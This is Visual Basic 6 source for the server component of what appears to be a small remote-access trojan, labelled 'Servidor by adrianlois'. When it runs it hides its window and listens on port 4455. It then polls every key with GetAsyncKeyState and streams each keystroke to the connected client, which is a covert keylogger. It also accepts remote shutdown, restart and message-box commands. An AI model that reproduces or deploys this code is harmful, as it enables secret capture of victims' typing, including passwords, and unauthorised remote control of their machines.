VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Servidor by adrianlois"
   ClientHeight    =   1755
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   3615
   LinkTopic       =   "Form1"
   ScaleHeight     =   1755
   ScaleWidth      =   3615
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   600
      Top             =   600
   End
   Begin MSWinsockLib.Winsock Sock1 
      Left            =   1680
      Top             =   600
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
Private Sub Form_Load()
Me.Hide
Sock1.Close
Sock1.LocalPort = "4455" 'Cambiar el puerto de escucha'
Sock1.Listen
End Sub
Private Sub Sock1_Close()
Sock1.Close
Sock1.Listen
End Sub

Private Sub Sock1_ConnectionRequest(ByVal requestID As Long)
Sock1.Close
Sock1.Accept requestID
End Sub

Private Sub Sock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String
Dim vector() As String
Sock1.GetData data, vbString
vector() = Split(data, "|")
If vector(0) = "message" Then
MsgBox vector(1), vbInformation, "Aviso de mensaje"
End If

Select Case vector(0)

Case "Apagar"
Shell "shutdown -s -t 30"

Case "Reiniciar"
Shell "shutdown -r -t 30"

Case "Abortar"
Shell "shutdown -a"

End Select
End Sub

Private Sub Sock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Sock1.Close
Sock1.Listen
End Sub

Private Sub Timer1_Timer()
Dim a1 As Integer
Dim a2 As String
If Sock1.State = sckConnected Then
For a1 = 1 To 255
If GetAsyncKeyState(a1) = -32767 Then
a2 = Chr(a1)
Sock1.SendData a2
End If
Next a1
Else
End If
End Sub
